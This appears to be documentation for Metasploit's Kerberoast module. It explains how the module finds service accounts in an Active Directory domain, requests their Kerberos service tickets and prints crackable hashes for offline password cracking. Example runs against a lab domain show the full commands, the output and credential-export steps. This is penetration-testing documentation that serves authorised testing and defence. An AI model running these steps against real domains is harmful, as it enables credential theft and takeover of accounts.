## Kerberoast

This module will try to find Service Principal Names (SPN) that are associated with normal user accounts on the specified domain, and then submit requests to retrieve Ticket Granting Service (TGS) tickets for those accounts, which may be partially encrypted with the SPN user's NTLM hash. After retrieving the TGS tickets, offline brute forcing attacks can be performed to retrieve the passwords for the SPN accounts.

## Module usage

- Start `msfconsole`
- Do: `use auxiliary/gather/kerberoast`
- Do: `run rhost=<IP> domain=<FQDN> password=<pass> username=<username> target_user=<optional_user>`
- If a target user has been requested, the module will log in to LDAP, find any SPNs associated with that user, and then request that service ticket.
- If no target user has been requested, the module will request service tickets for all available users.
- A crackable value will be displayed for all valid accounts.


## Options

### DOMAIN / LDAPDOMAIN
The Fully Qualified Domain Name (FQDN). Ex: mydomain.local.

### USERNAME / LDAPUSERNAME
The username to authenticate to the DC with

### PASSWORD / LDAPPASSWORD
The password to authenticate to the DC with

### Rhostname

The hostname of the domain controller. Must be accurate otherwise the module will silently fail, even if users exist without pre-auth required.

## Scenarios

### Target user

To retrieve a TGS for a particular user, set `TARGET_USER`.

```msf
msf6 auxiliary(gather/kerberoast) > run rhost=20.248.208.9 ldapdomain=msf.local ldappassword=PasswOrd123 ldapusername=AzureAdmin target_user=low.admin
[*] Running module against 20.248.208.9
[+] 20.248.208.9:88 - Received a valid TGT-Response
[*] 20.248.208.9:389 - TGT MIT Credential Cache ticket saved to /home/user/.msf4/loot/20250513155454_default_20.248.208.9_mit.kerberos.cca_656516.bin
[+] 20.248.208.9:88 - Received a valid TGS-Response
[*] 20.248.208.9:389 - TGS MIT Credential Cache ticket saved to /home/user/.msf4/loot/20250513155454_default_20.248.208.9_mit.kerberos.cca_233943.bin
[+] Success:
$krb5tgs$17$low.admin$MSF.LOCAL$*http/abc.msf.local*$faf4a87156a49afd69de3c8b$582f8daec4a5f88fba...
[*] Auxiliary module execution completed
```

### All users

```
msf6 auxiliary(gather/kerberoast) > run rhost=20.248.208.9 ldapdomain=msf.local ldappassword=PasswOrd123 ldapusername=AzureAdmin
[*] Running module against 20.248.208.9

[+] 20.248.208.9:88 - Received a valid TGT-Response
[*] 20.248.208.9:389 - TGT MIT Credential Cache ticket saved to /home/smash/.msf4/loot/20250513155630_default_20.248.208.9_mit.kerberos.cca_281438.bin
[+] 20.248.208.9:88 - Received a valid TGS-Response
[*] 20.248.208.9:389 - TGS MIT Credential Cache ticket saved to /home/smash/.msf4/loot/20250513155630_default_20.248.208.9_mit.kerberos.cca_360340.bin
[+] 20.248.208.9:88 - Received a valid TGT-Response
[*] 20.248.208.9:389 - TGT MIT Credential Cache ticket saved to /home/smash/.msf4/loot/20250513155630_default_20.248.208.9_mit.kerberos.cca_642663.bin
[+] 20.248.208.9:88 - Received a valid TGS-Response
[*] 20.248.208.9:389 - TGS MIT Credential Cache ticket saved to /home/smash/.msf4/loot/20250513155630_default_20.248.208.9_mit.kerberos.cca_556183.bin

[+] Query returned 2 results.
[+] Success:
$krb5tgs$23$*kerber.roastable$MSF.LOCAL$http/abc2.msf.local*$d335dc07b2c018de2a19e2ecc102bd1d$abc848...
$krb5tgs$17$low.admin$MSF.LOCAL$*http/abc.msf.local*$a1c7c1c1e31e36cdb0721928$b69b48...
[!] NOTE: Multiple encryption types returned - will require separate cracking runs for each type.
[*] To obtain the crackable values for a praticular type, run `creds`:
[*] creds -t krb5tgs-rc4 -O 20.248.208.9 -o <outfile.(jtr|hcat)>
[*] creds -t krb5tgs-aes128 -O 20.248.208.9 -o <outfile.(jtr|hcat)>
[*] Auxiliary module execution completed
```